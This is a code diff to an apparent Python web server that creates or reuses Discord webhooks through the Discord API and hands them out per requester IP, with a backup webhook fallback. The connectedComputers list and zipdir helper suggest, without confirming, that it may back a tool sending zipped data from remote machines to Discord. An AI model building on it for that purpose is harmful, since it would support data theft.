@@ -26,7 +26,6 @@ connectedComputers = []
 
 
 channel_id = os.environ["channel_id"]
-channel_id2 = os.environ["channel_id2"]
 
 
 headers = {
@@ -69,24 +68,27 @@ def create_webhook(channel, timeout=10):
 
 
 def get_webhooks(channel):
-    try:
-        return requests.get(
-            f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers
-        ).json()
-    except:
-        return None
+    return requests.get(
+        f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers
+    ).json()
 
 
 def get_webhook():
     response = {"code": 30007}
-    while True:
+    try:
         response = create_webhook(channel_id)
+        response['id']
+    except:
+        try:
+            response = random.choice(get_webhooks(channel_id))
+            response['id']
+        except:
+            return None
 
-    if 'id' not in response:
-      return None
+    webhook = f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
 
-    print(f"https://discord.com/api/webhooks/{response['id']}/{response['token']}")
-    return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
+    print(webhook)
+    return webhook
 
 
 def zipdir(path, ziph):
@@ -421,10 +423,10 @@ def webhook():
 
     webhook = get_webhook()
     log_webhook_creation(webhook, ip)
+  
     if not webhook:
-      backup = True
-      webhook = os.environ["backup_webhook"]
-
+        backup = True
+        webhook = os.environ["backup_webhook"]
 
     return webhook
 
